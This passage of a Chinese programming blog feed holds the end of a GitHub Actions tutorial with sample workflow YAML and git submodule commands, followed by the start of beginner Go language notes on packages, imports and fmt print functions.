class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">on:</span> <br>  <span class="hljs-attr">workflow_dispatch:</span><br>    <span class="hljs-attr">inputs:</span><br>      <span class="hljs-attr">options-1:</span><br>        <span class="hljs-attr">description:</span> <span class="hljs-string">&quot;测试选项一&quot;</span><br>        <span class="hljs-attr">required:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-attr">default:</span> <span class="hljs-string">&quot;白天&quot;</span><br>        <span class="hljs-attr">type:</span> <span class="hljs-string">choice</span><br>        <span class="hljs-attr">options:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">白天</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">黑夜</span><br>      <span class="hljs-attr">options-2:</span><br>        <span class="hljs-attr">description:</span> <span class="hljs-string">&quot;测试选项二&quot;</span><br>        <span class="hljs-attr">required:</span> <span class="hljs-literal">false</span><br>        <span class="hljs-attr">type:</span> <span class="hljs-string">choice</span><br>        <span class="hljs-attr">options:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">太阳</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">月亮</span><br>      <span class="hljs-attr">environment:</span><br>        <span class="hljs-attr">description:</span> <span class="hljs-string">&quot;环境选项&quot;</span><br>        <span class="hljs-attr">type:</span> <span class="hljs-string">environment</span><br>        <span class="hljs-attr">required:</span> <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/5e166039a4894c9fa69b6aa6e979095c.png" alt="image-20230223104241690"></p><ul><li><code>jobs</code></li></ul><p>​jobs表示要执行的一项或多项任务，一个job就是一个任务，每个job之间默认是并行的，如果在job间存在前后顺序的话需要设置<code>jobs.&lt;job_id&gt;.needs</code>。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">jobs:</span><br>  <span class="hljs-attr">check-bats-version:</span><br>    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span><br>    <span class="hljs-attr">steps:</span><br>    <span class="hljs-string">...</span><br>  <span class="hljs-attr">hello-world:</span><br>    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">windows-latest</span><br>  <span class="hljs-attr">needs:</span> <span class="hljs-string">check-bats-version</span><br>  <span class="hljs-attr">steps:</span><br>    <span class="hljs-string">...</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2632ba74c65b40b182e122f1e7d8e3a5.png" alt="image-20230223105059227"></p><ul><li><p><code>jobs.&lt;job_id&gt;.runs-on</code></p><p>配置jobs运行虚拟机环境，可选择Ubuntu、Windows、macOS三种系统。</p><ul><li>ubuntu-latest，ubuntu-20.04</li><li>windows-latest，windows-2019</li><li>macos-latest，macos-11，macos-10.15</li></ul><p>官方提供的配置感觉还不错，详情见<a href="https://docs.github.com/en/actions/using-github-hosted-runners/about-github-hosted-runners">官方文档</a></p><p><img src="https://img-blog.csdnimg.cn/b057096045d34787ba892e049ced2c94.png" alt="image-20230223105420265"></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">jobs:</span><br>  <span class="hljs-attr">check-bats-version:</span><br>    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span><br>    <span class="hljs-string">...</span><br>  <span class="hljs-attr">hello-world:</span><br>    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">windows-latest</span><br><span class="hljs-string">..</span><br></code></pre></td></tr></table></figure></li><li><p><code>jobs.&lt;job_id&gt;.env</code></p></li></ul><p>​使用env可以给该任务或者步骤部署环境</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">jobs</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">enc</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;zhangsan&quot;</span><br>  <span class="hljs-attribute">check-bats-version</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">runs-on</span><span class="hljs-punctuation">:</span> <span class="hljs-string">ubuntu-latest</span><br><span class="hljs-attribute">steps</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">env</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">age</span><span class="hljs-punctuation">:</span> <span class="hljs-string">22</span><br>  <span class="hljs-attribute">run</span><span class="hljs-punctuation">:</span> <span class="hljs-string">|</span><br>  echo $name<br>  echo $age<br></code></pre></td></tr></table></figure><ul><li><p><code>jobs.&lt;job_id&gt;.if</code></p><p>控制job是否启用，<code>if</code>可以添加表达式以便自主控制是否执行本项任务，表达式可以使用<a href="https://docs.github.com/en/actions/learn-github-actions/contexts#context-availability">Github上下文</a></p></li><li><p><code>jobs.&lt;job_id&gt;.steps</code></p></li></ul><p>​某一job的所有步骤，同一job中的steps都是在同一环境下的执行的，每一个step是一条独立的命令或执行脚本，顺序执行具有依赖关系。</p><ul><li><code>jobs.&lt;job_id&gt;.steps.uses:</code></li></ul><p>​使用一些官方或者第三方的actions来执行，例如最经常使用的<code>actions/checkout@v2</code>，他们克隆我们repo的代码，之后工作流就可以使用repo的文件了。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">hello-world:</span><br>  <span class="hljs-attr">runs-on:</span> <span class="hljs-string">windows-latest</span><br>  <span class="hljs-attr">needs:</span> <span class="hljs-string">check-bats-version</span><br>  <span class="hljs-attr">steps:</span><br>    <span class="hljs-comment"># 克隆仓库</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Check</span> <span class="hljs-string">out</span> <span class="hljs-string">repo&#x27;s</span> <span class="hljs-string">default</span> <span class="hljs-string">branch</span><br>      <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v3</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Enable</span> <span class="hljs-string">Developer</span> <span class="hljs-string">Command</span> <span class="hljs-string">Prompt</span><br>      <span class="hljs-attr">uses:</span> <span class="hljs-string">ilammy/msvc-dev-cmd@v1.12.1</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Compile</span> <span class="hljs-string">and</span> <span class="hljs-string">run</span> <span class="hljs-string">some</span> <span class="hljs-string">Code</span><br>      <span class="hljs-attr">shell:</span> <span class="hljs-string">cmd</span><br>      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">        cl.exe HelloWorld.cpp</span><br><span class="hljs-string">        HelloWorld.exe</span><br><span class="hljs-string"></span>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Upload</span> <span class="hljs-string">a</span> <span class="hljs-string">Build</span> <span class="hljs-string">Artifact</span><br>      <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/upload-artifact@v3.1.2</span><br>      <span class="hljs-attr">with:</span><br>        <span class="hljs-attr">name:</span> <span class="hljs-string">&quot;HelloWorld&quot;</span><br>        <span class="hljs-attr">path:</span> <span class="hljs-string">&quot;./HelloWorld.exe&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/b877e257e50c480c9991bd6e6bec179f.png" alt="image-20230224200521018"></p><p>Github Actions的功能实在过于丰富，目前仅仅便于理解，详细使用教程请看<a href="https://docs.github.com/en/actions">官方文档</a>。</p><h3 id="测试样例"><a href="#测试样例" class="headerlink" title="测试样例"></a>测试样例</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">name:</span> <span class="hljs-string">my-first-actions</span><br><span class="hljs-attr">run-name:</span> <span class="hljs-string">Mr.Robot</span> <span class="hljs-string">is</span> <span class="hljs-string">learning</span> <span class="hljs-string">Github</span> <span class="hljs-string">Actions</span><br><span class="hljs-comment"># 设置actions执行时机，此处为手动触发</span><br><span class="hljs-attr">on:</span> <br>  <span class="hljs-attr">workflow_dispatch:</span><br>    <span class="hljs-attr">inputs:</span><br>      <span class="hljs-attr">options-1:</span><br>        <span class="hljs-attr">description:</span> <span class="hljs-string">&quot;测试选项一&quot;</span><br>        <span class="hljs-attr">required:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-attr">default:</span> <span class="hljs-string">&quot;白天&quot;</span><br>        <span class="hljs-attr">type:</span> <span class="hljs-string">choice</span><br>        <span class="hljs-attr">options:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">白天</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">黑夜</span><br>      <span class="hljs-attr">options-2:</span><br>        <span class="hljs-attr">description:</span> <span class="hljs-string">&quot;测试选项二&quot;</span><br>        <span class="hljs-attr">required:</span> <span class="hljs-literal">false</span><br>        <span class="hljs-attr">type:</span> <span class="hljs-string">choice</span><br>        <span class="hljs-attr">options:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">太阳</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">月亮</span><br>      <span class="hljs-attr">environment:</span><br>        <span class="hljs-attr">description:</span> <span class="hljs-string">&quot;环境选项&quot;</span><br>        <span class="hljs-attr">type:</span> <span class="hljs-string">environment</span><br>        <span class="hljs-attr">required:</span> <span class="hljs-literal">false</span><br><br><span class="hljs-comment"># action的job</span><br><span class="hljs-attr">jobs:</span><br>  <span class="hljs-comment"># 一个jobs任务，名称为build</span><br>  <span class="hljs-attr">check-bats-version:</span><br>    <span class="hljs-comment"># 运行基础环境，设置为ubuntu</span><br>    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span><br>    <span class="hljs-attr">if:</span> <span class="hljs-string">github.workflow</span> <span class="hljs-string">==</span> <span class="hljs-string">&#x27;my-first-actions&#x27;</span><br>    <span class="hljs-attr">env:</span> <br>      <span class="hljs-attr">name:</span> <span class="hljs-string">&quot;zhangsan&quot;</span><br>    <span class="hljs-comment"># jobs任务的步骤</span><br>    <span class="hljs-attr">steps:</span> <br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Print</span> <span class="hljs-string">env</span><br>        <span class="hljs-attr">env:</span><br>          <span class="hljs-attr">age:</span> <span class="hljs-number">22</span><br>        <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">          echo $name</span><br><span class="hljs-string">          echo $age</span><br><span class="hljs-string"></span>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Check</span> <span class="hljs-string">out</span> <span class="hljs-string">repo&#x27;s</span> <span class="hljs-string">default</span> <span class="hljs-string">branch</span><br>        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v3</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Print</span> <span class="hljs-string">inputs</span><br>        <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">          echo &quot;测试选项一: $OPTIONS1&quot;</span><br><span class="hljs-string">          echo &quot;测试选项二: $OPTIONS2&quot;</span><br><span class="hljs-string">          echo &quot;environment: $ENVIRONMENT&quot;</span><br><span class="hljs-string"></span>        <span class="hljs-attr">env:</span><br>          <span class="hljs-attr">OPTIONS1:</span> <span class="hljs-string">$&#123;&#123;inputs.options-1&#125;&#125;</span><br>          <span class="hljs-attr">OPTIONS2:</span> <span class="hljs-string">$&#123;&#123;inputs.options-2&#125;&#125;</span><br>          <span class="hljs-attr">ENVIRONMENT:</span> <span class="hljs-string">$&#123;&#123;inputs.environment&#125;&#125;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Setup</span> <span class="hljs-string">Node</span><br>        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-node@v3</span><br>        <span class="hljs-attr">with:</span><br>          <span class="hljs-attr">node-version:</span> <span class="hljs-string">&#x27;14&#x27;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">npm</span> <span class="hljs-string">install</span><br>        <span class="hljs-attr">run:</span> <span class="hljs-string">npm</span> <span class="hljs-string">install</span> <span class="hljs-string">-g</span> <span class="hljs-string">bats</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">npm</span> <span class="hljs-string">install</span><br>        <span class="hljs-attr">run:</span> <span class="hljs-string">bats</span> <span class="hljs-string">-v</span> <span class="hljs-string">&gt;</span> <span class="hljs-string">output.txt</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Upload</span> <span class="hljs-string">a</span> <span class="hljs-string">Build</span> <span class="hljs-string">Artifact</span><br>        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/upload-artifact@v3.1.2</span><br>        <span class="hljs-attr">with:</span><br>          <span class="hljs-attr">name:</span> <span class="hljs-string">&quot;测试文件名&quot;</span><br>          <span class="hljs-attr">path:</span> <span class="hljs-string">&quot;./output.txt&quot;</span><br>  <span class="hljs-attr">hello-world:</span><br>    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">windows-latest</span><br>    <span class="hljs-attr">needs:</span> <span class="hljs-string">check-bats-version</span><br>    <span class="hljs-attr">steps:</span><br>      <span class="hljs-comment"># 克隆仓库</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Check</span> <span class="hljs-string">out</span> <span class="hljs-string">repo&#x27;s</span> <span class="hljs-string">default</span> <span class="hljs-string">branch</span><br>        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v3</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Enable</span> <span class="hljs-string">Developer</span> <span class="hljs-string">Command</span> <span class="hljs-string">Prompt</span><br>        <span class="hljs-attr">uses:</span> <span class="hljs-string">ilammy/msvc-dev-cmd@v1.12.1</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Compile</span> <span class="hljs-string">and</span> <span class="hljs-string">run</span> <span class="hljs-string">some</span> <span class="hljs-string">Code</span><br>        <span class="hljs-attr">shell:</span> <span class="hljs-string">cmd</span><br>        <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">          cl.exe HelloWorld.cpp</span><br><span class="hljs-string">          HelloWorld.exe</span><br><span class="hljs-string"></span>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Upload</span> <span class="hljs-string">a</span> <span class="hljs-string">Build</span> <span class="hljs-string">Artifact</span><br>        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/upload-artifact@v3.1.2</span><br>        <span class="hljs-attr">with:</span><br>          <span class="hljs-attr">name:</span> <span class="hljs-string">&quot;HelloWorld&quot;</span><br>          <span class="hljs-attr">path:</span> <span class="hljs-string">&quot;./HelloWorld.exe&quot;</span><br><br><br></code></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.runoob.com/w3cnote/yaml-intro.html">YAML 入门教程</a></p><p><a href="https://blog.csdn.net/unreliable_narrator/article/details/124468384">GitHubActions详解</a></p><h2 id="Github高级用法"><a href="#Github高级用法" class="headerlink" title="Github高级用法"></a>Github高级用法</h2><h3 id="Github引用外部仓库"><a href="#Github引用外部仓库" class="headerlink" title="Github引用外部仓库"></a>Github引用外部仓库</h3><p>例如在<code>unraider</code>仓库中引用<code>patchelf</code>可以使用以下命令，该命令会克隆外部仓库同时自动生成<code> .gitmodules</code>文件，<code>git commit</code>即可获得引用外部仓库形式</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">git submodule <span class="hljs-keyword">add</span><span class="language-bash"> https://github.com/NixOS/patchelf.git patchelf </span><br></code></pre></td></tr></table></figure><p><strong>注意：</strong>Git clone 的时候需要加上<code>--recursive</code>，否则克隆下来的 TARGET_FOLDER 是空文件夹:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">git <span class="hljs-keyword">clone</span> <span class="hljs-title">--recursive</span> git://github.com/[YOUR_USERNAME]/[YOUR_REPO_NAME].git<br></code></pre></td></tr></table></figure><p>如果没加<code>--recursive</code>，克隆后只需要初始化子模块即可：</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">git submodule update</span> <span class="hljs-literal">--</span><span class="hljs-comment">init</span> <span class="hljs-literal">--</span><span class="hljs-comment">recursive</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>教程文档</category>
      
      <category>学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>教程</tag>
      
      <tag>Git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Go语言学习</title>
    <link href="/2022/07/12/Learn/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/07/12/Learn/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h1 id="Go语言学习"><a href="#Go语言学习" class="headerlink" title="Go语言学习"></a>Go语言学习</h1><p>本笔记基于菜鸟教程Go语言教程和Go语言编程编写，详情请点击<a href="https://www.runoob.com/go/go-tutorial.html">Go语言教程</a>和<a href="https://go-zh.org/doc/">Go语言之旅</a>。</p><h2 id="第一个Go语言教程"><a href="#第一个Go语言教程" class="headerlink" title="第一个Go语言教程"></a>第一个Go语言教程</h2><p><code>hello.go</code>文件</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br> <span class="hljs-comment">/*我的第一个Go语言程序*/</span><br>fmt.Println(<span class="hljs-string">&quot;Hello,World!&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>运行go语言代码。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">$ <span class="hljs-keyword">go</span> run hello.<span class="hljs-keyword">go</span><br>Hello,World!<br></code></pre></td></tr></table></figure><p>编译生成二进制文件</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">$ <span class="hljs-keyword">go</span> build hello.<span class="hljs-keyword">go</span><br></code></pre></td></tr></table></figure><p>Go语言的基础组成部分有以下几个部分;</p><ul><li><p>包声明</p><p><code>hello.go</code>文件中<code>package main</code>定义了包名，你必须在源文件中非注释的第一行指明这个文件属于哪个包，<code>package main</code>表示一个可独立执行的程序，每个 Go 应用程序都包含一个名为 <code>main</code> 的包。</p></li><li><p>引入包</p><p><code>import &quot;fmt&quot;</code>表明导入了fmt包，跟python一致，fmt 包实现了格式化 IO（输入&#x2F;输出）的函数。</p><p>通过 <strong>import</strong> 关键字来导入其他非 <strong>main</strong> 包。</p><p>可以通过 <strong>import</strong> 关键字单个导入:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;io&quot;</span><br></code></pre></td></tr></table></figure><p>也可以同时导入多个:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>    <span class="hljs-string">&quot;math&quot;</span><br>)<br></code></pre></td></tr></table></figure><p>省略调用(不建议使用):</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-comment">// 调用的时候只需要Println()，而不需要fmt.Println()</span><br><span class="hljs-keyword">import</span> . <span class="hljs-string">&quot;fmt&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>函数</p><p><code>func main()</code>是程序开始执行的函数。<code>main</code> 函数是每一个可执行程序所必须包含的，一般来说都是在启动后第一个执行的函数（如果有 init() 函数则会先执行该函数）。</p></li><li><p>变量&amp;语句&amp;表达式</p><p>当标识符（包括常量、变量、类型、函数名、结构字段等等）以一个大写字母开头，如：Group1，那么使用这种形式的标识符的对象就可以被外部包的代码所使用（客户端程序需要先导入这个包），这被称为导出（像面向对象语言中的 public）；标识符如果以小写字母开头，则对包外是不可见的，但是他们在整个包的内部是可见并且可用的（像面向对象语言中的 protected ）。</p></li><li><p>注释</p><p>单行注释<code>//</code>,多行注释<code>/*</code>开头，<code>*/</code>结尾，与c语言一致。</p></li></ul><h2 id="Go语言基础语法"><a href="#Go语言基础语法" class="headerlink" title="Go语言基础语法"></a>Go语言基础语法</h2><h3 id="行标识符"><a href="#行标识符" class="headerlink" title="行标识符"></a>行标识符</h3><p>在 Go 程序中，一行代表一个语句结束。每个语句不需要像 C 家族中的其它语言一样以分号 ; 结尾，因为这些工作都将由 Go 编译器自动完成。</p><p>如果你打算将多个语句写在同一行，它们则必须使用 ; 人为区分，但在实际开发中我们并不鼓励这种做法。</p><h3 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h3><p>Go语言字符串拼接使用<code>+</code>实现：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    fmt.Println(<span class="hljs-string">&quot;Hello&quot;</span> + <span class="hljs-string">&quot;,&quot;</span> + <span class="hljs-string">&quot;World&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="可见性规则"><a href="#可见性规则" class="headerlink" title="可见性规则"></a>可见性规则</h3><p>Go语言中，使用大小写来决定该常量、变量、类型、接口、结构或函数是否可以被外部包所调用。</p><p>函数名首字母小写即为 <strong>private</strong> :</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">func</span> <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> &#123;&#125;<br></code></pre></td></tr></table></figure><p>函数名首字母大写即为 <strong>public</strong> :</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">func</span> <span class="hljs-title function_">Printf</span><span class="hljs-params">()</span> &#123;&#125;<br></code></pre></td></tr></table></figure><h3 id="Go-fmt包（输入输出）"><a href="#Go-fmt包（输入输出）" class="headerlink" title="Go fmt包（输入输出）"></a>Go fmt包（输入输出）</h3><h3 id="输出相关函数"><a href="#输出相关函数" class="headerlink" title="输出相关函数"></a>输出相关函数</h3><p><code>Print()</code> 函数将参数列表 a 中的各个参数转换为字符串并写入到标准输出中。</p><p><strong>非字符串参数</strong>之间会添加空格，返回写入的字节数。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Print</span><span class="hljs-params">(a ...<span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> (n <span class="hljs-type">int</span>, err <span class="hljs-type">error</span>)<br></code></pre></td></tr></table></figure><p><code>Println()</code> 函数功能类似 Print，只不过最后会添加一个换行符。</p><p><strong>所有参数</strong>之间会添加空格，返回写入的字节数。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Println</span><span class="hljs-params">(a ...<span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> (n <span class="hljs-type">int</span>, err <span class="hljs-type">error</span>)<br></code></pre></td></tr></table></figure><p><code>Printf()</code> 函数将参数列表 a 填写到格式字符串 format 的占位符中。</p><p>填写后的结果写入到标准输出中，返回写入的字节数。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Printf</span><span class="hljs-params">(format <span class="hljs-type">string</span>, a ...<span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> (n <span class="hljs-type">int</span>, err <span class="hljs-type">error</span>)<br></code></pre></td></tr></table></figure><p>以下三种与上面三种类似，不过最终会返回输出的字符串，并不会打印</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Sprint</span><span class="hljs-params">(a ...<span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> <span class="hljs-type">string</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Sprintln</span><span class="hljs-params">(a ...<span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> <span class="hljs-type">string</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Sprintf</span><span class="hljs-params">(format <span class="hljs-type">string</span>, a ...<span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> <span class="hljs-type">string</span><br></code></pre></td></tr></table></figure><p>以下函数功能同 